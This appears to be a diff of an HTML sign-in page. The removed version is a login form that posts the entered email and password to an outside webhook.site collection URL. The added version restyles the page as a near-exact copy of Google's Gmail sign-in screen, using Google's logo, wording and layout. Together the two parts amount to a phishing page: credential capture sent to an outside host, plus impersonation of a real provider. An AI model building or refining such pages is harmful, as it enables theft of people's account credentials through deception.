@@ -1,168 +1,121 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Sign In</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gmail – Sign in</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet"/>
   <style>
-    * {
-      box-sizing: border-box;
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{
+      font-family:"Google Sans",Arial,Helvetica,sans-serif;
+      background:#f1f3f4;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      min-height:100vh;
+      color:#202124;
+      font-size:14px;
     }
-
-    body {
-      font-family: 'Roboto', sans-serif;
-      background-color: #f1f3f4;
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    .center-box{
+      background:#fff;
+      padding:48px 40px 36px;
+      border-radius:8px;
+      box-shadow:0 2px 10px rgba(0,0,0,.1);
+      width:100%;
+      max-width:450px;
     }
-
-    .container {
-      background: #fff;
-      padding: 48px 40px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 400px;
-      overflow: hidden;
-      position: relative;
+    .logo{margin-bottom:10px}
+    h1{font-size:24px;font-weight:400;margin-bottom:8px}
+    p{color:#5f6368;margin-bottom:30px}
+    .field{position:relative;margin-bottom:30px}
+    input[type=email]{
+      width:100%;
+      height:56px;
+      padding:16px 14px 6px;
+      border:1px solid #dadce0;
+      border-radius:4px;
+      font-size:16px;
     }
-
-    .logo {
-      width: 72px;
-      margin: 0 auto 20px;
-      display: block;
-      animation: fadeIn 1s ease-out;
+    label{
+      position:absolute;
+      left:14px;
+      top:18px;
+      color:#5f6368;
+      pointer-events:none;
+      transition:.2s;
     }
-
-    h2 {
-      font-weight: 400;
-      font-size: 24px;
-      margin-bottom: 8px;
-      text-align: center;
-      animation: fadeIn 1s ease-out;
+    input:focus+label,
+    input:not(:placeholder-shown)+label{
+      top:6px;
+      font-size:12px;
+      color:#1a73e8;
     }
-
-    .input-field {
-      position: relative;
-      margin: 24px 0;
-      opacity: 0;
-      transform: translateY(20px);
-      animation: slideUp 0.5s forwards;
+    input:focus{outline:none;border:2px solid #1a73e8}
+    a{color:#1a73e8;text-decoration:none;font-weight:500}
+    .forgot{display:block;margin:-20px 0 30px}
+    .guest{color:#5f6368;margin-bottom:32px;line-height:1.5}
+    .actions{display:flex;justify-content:space-between;align-items:center}
+    button{
+      background:#1a73e8;
+      color:#fff;
+      border:none;
+      padding:10px 24px;
+      border-radius:4px;
+      font-size:14px;
+      cursor:pointer;
     }
-
-    .input-field:nth-child(1) {
-      animation-delay: 0.3s;
+    button:hover{background:#1765cc}
+    footer{
+      width:100%;
+      max-width:450px;
+      margin-top:24px;
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      font-size:12px;
+      color:#5f6368;
     }
-
-    .input-field:nth-child(2) {
-      animation-delay: 0.5s;
-    }
-
-    input {
-      width: 100%;
-      padding: 14px;
-      font-size: 16px;
-      border: 1px solid #dadce0;
-      border-radius: 6px;
-      transition: border-color 0.3s;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #1a73e8;
-    }
-
-    .button-group {
-      margin-top: 24px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    button {
-      background-color: #1a73e8;
-      color: white;
-      border: none;
-      padding: 12px 24px;
-      font-size: 16px;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-
-    button:hover {
-      background-color: #1558b0;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
-    }
-
-    @keyframes slideUp {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .hidden {
-      display: none;
-    }
+    nav a{margin-left:20px}
+    select{border:none;background:transparent;color:#5f6368;cursor:pointer}
   </style>
 </head>
 <body>
+  <div class="center-box">
+    <img class="logo" src="https://accounts.google.com/gsi/style/logos/googlelogo_color_92x36dp.png" alt="Google"/>
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
 
-  <div class="container">
-    <img class="logo" src="https://via.placeholder.com/72?text=LOGO" alt="Logo" />
-    <h2 id="formTitle">Sign in</h2>
-
-    <form id="loginForm" action="https://webhook.site/dbd0ab12-b57d-4b7d-9567-457cb1d8abf9" method="POST">
-      
-      <div class="input-field" id="emailField">
-        <input type="email" id="emailInput" name="email" placeholder="Email or phone" required />
+    <form>
+      <div class="field">
+        <input type="email" id="email" required placeholder=" "/>
+        <label for="email">Email or phone</label>
       </div>
 
-      <div class="input-field hidden" id="passwordField">
-        <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required />
+      <a href="#" class="forgot">Forgot email?</a>
+
+      <div class="guest">
+        Not your computer? Use a private browsing window to sign in.
+        <a href="#">Learn more</a>
       </div>
 
-      <div class="button-group">
-        <button type="button" id="nextBtn">Next</button>
-        <button type="submit" id="loginBtn" class="hidden">Login</button>
+      <div class="actions">
+        <a href="#" class="create">Create account</a>
+        <button type="submit">Next</button>
       </div>
-
     </form>
   </div>
 
-  <script>
-    const nextBtn = document.getElementById('nextBtn');
-    const loginBtn = document.getElementById('loginBtn');
-    const emailInput = document.getElementById('emailInput');
-    const passwordField = document.getElementById('passwordField');
-    const emailField = document.getElementById('emailField');
-    const formTitle = document.getElementById('formTitle');
-
-    nextBtn.addEventListener('click', () => {
-      if (emailInput.checkValidity()) {
-        emailInput.readOnly = true;
-        emailInput.style.backgroundColor = '#f1f3f4';
-        emailField.classList.add('readonly');
-
-        passwordField.classList.remove('hidden');
-        loginBtn.classList.remove('hidden');
-        nextBtn.classList.add('hidden');
-        formTitle.textContent = "Welcome";
-      } else {
-        emailInput.reportValidity();
-      }
-    });
-  </script>
-
+  <footer>
+    <select>
+      <option value="en">English (United States)</option>
+    </select>
+    <nav>
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </nav>
+  </footer>
 </body>
 </html>
